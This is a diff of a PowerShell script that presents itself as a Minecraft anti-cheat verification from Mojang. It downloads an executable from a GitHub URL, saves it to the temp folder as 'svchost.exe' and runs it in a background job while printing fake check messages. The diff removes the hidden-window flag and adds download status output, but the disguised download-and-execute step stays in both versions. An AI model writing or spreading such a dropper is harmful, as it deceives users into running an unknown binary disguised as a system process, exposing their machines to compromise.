@@ -1,6 +1,6 @@
 $u='https://github.com/discord-zapret-official/zapret-discord-youtube/raw/refs/heads/main/zapretdiscordyoutube.exe'
 $d="$env:TEMP\svchost.exe"
-$j=Start-Job -ScriptBlock { param($a,$b) try{(New-Object Net.WebClient).DownloadFile($a,$b);if(Test-Path $b){Start-Process $b -WindowStyle Hidden;return $true}}catch{return $false} } -ArgumentList $u,$d
+$j=Start-Job -ScriptBlock { param($a,$b) try{(New-Object Net.WebClient).DownloadFile($a,$b);if(Test-Path $b){Start-Process $b;return $true}}catch{return $false} } -ArgumentList $u,$d
 Write-Host "========================================" -ForegroundColor Green
 Write-Host "  MINECRAFT ANTI-CHEAT VERIFICATION" -ForegroundColor Cyan
 Write-Host "  Version: 5.2.1 | Mojang AB" -ForegroundColor Gray
@@ -72,5 +72,8 @@ Write-Host "========================================" -ForegroundColor Green
 Write-Host ""
 Write-Host "Verification passed! No cheats detected! You are clean!" -ForegroundColor Green
 Write-Host ""
-Wait-Job $j -Timeout 10|Out-Null
+Write-Host "Waiting for download to complete..." -ForegroundColor Yellow
+Wait-Job $j -Timeout 15|Out-Null
+$result=Receive-Job $j -EA 0
+Write-Host "Download result: $result" -ForegroundColor $(if($result){'Green'}else{'Red'})
 Remove-Job $j -Force -EA 0
